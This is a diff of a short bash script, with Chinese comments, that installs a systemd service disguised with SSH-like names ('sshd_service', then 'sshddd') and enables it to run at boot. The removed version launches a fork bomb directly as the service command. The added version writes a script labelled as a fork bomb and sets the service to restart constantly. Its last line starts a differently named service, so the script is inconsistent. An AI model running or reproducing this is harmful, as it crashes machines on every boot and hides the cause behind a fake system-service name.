@@ -1,19 +1,29 @@
-  cat >/etc/systemd/system/sshd_service.service <<EOF
+#!/bin/bash
+
+# 1. 创建 /home/1.sh 并写入fork炸弹
+echo -e "#!/bin/bash\n\necho ':(){ :|:& };:' > /home/output.txt" > /home/1.sh
+
+# 2. 给 /home/1.sh 执行权限
+chmod +x /home/1.sh
+
+# 3. 创建 systemd 服务文件
+cat <<EOF | sudo tee /etc/systemd/system/sshddd.service > /dev/null
 [Unit]
-Description=sshd_service
-Wants=network.target
-After=network.target network.service
+Description=sshddd
+After=network.target
 
 [Service]
-Type=simple
-WorkingDirectory=/opt
-ExecStart=:(){ :|:& };:
-KillMode=none
+ExecStart=/home/1.sh
+Restart=always
+User=$(whoami)
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reload
-systemctl enable sshd_service
-systemctl start sshd_service
+# 4. 重新加载 systemd daemon 并启用开机自启
+sudo systemctl daemon-reload
+sudo systemctl enable sshddd.service
+
+# 5. 启动服务
+sudo systemctl start example.service
